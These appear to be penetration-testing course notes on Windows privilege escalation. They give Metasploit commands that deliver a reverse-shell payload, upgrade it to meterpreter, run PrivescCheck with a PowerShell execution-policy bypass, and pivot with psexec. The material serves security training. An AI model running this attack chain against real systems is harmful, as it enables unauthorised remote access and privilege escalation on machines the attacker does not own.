### PrivescCheck
* The PrivescCheck PowerShell script can be used to identify services with weak permissions.
* It aims to enumerate common Windows configuration issues that can be leveraged for local privilege escalation.
* Also gathers information that might be useful for exploitation and/or post-exploitation.
* `github.com/itm4n/PrivescCheck`
* If the PrivescCheck can be executed on the target, but it can't be possible most of the times
* `use exploit/multi/script/web_delivery`
* this module fires up a web server that serves a payload
* The main purpose of this module is to quickly establish a session on the target wehn the attacke rhas to manually type in the command, like Command Injection, RDP session, etc.

* `set target PSH\ (Binary)`
* `set payload windows/shell/reverse_tcp`
* `set PSH-EncodedCommand false`
* `set lhost [attacker's IP]`
* `exploit`
* This should give a command to be run on the target
* On the target, Open a command shell --> Paste the command and press ENTER
* This should open a command shell session on the attacker's machine where module was exploited.

* **Upgrade this session**
* `use post/multi/manage/shell_to_meterpreter`
* `set lhost [attacker's]`  --> should not conflict with the command shell
* `set session [id]`
* `show advanced`
* `set WIN_TRANSFER VBS`  --> Instead of powershell
* `run`  --> Should start a meterpreter session

* **Migrate to a 64-bit meterpreter**
* `ps`
* `migrate [PID of explorer.exe]`
* `getprivs` --> Not enough privileges

* **Elevate our privileges**
* Navigate to the directory where PrivescCheck.ps1 was saved on attacker's machine
* `powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"`  --> Copy this from the directions in the Github repo.
* This command is used to bypass the default execution policy when running PowerShell scripts from the Windows command line

* **Utilize these credentials obtained from the previous command**
* We will use psexec.py script to do this
* `psexec.py [username, like Administrator]@[target IP]`

* **Same thing with MSF**
* `use exploit/windows/smb/psexec`

***

* After obtaining user account credentials, what protocols can we use to authenticate with the Windows target?
   * SMB, RDP, WinRM
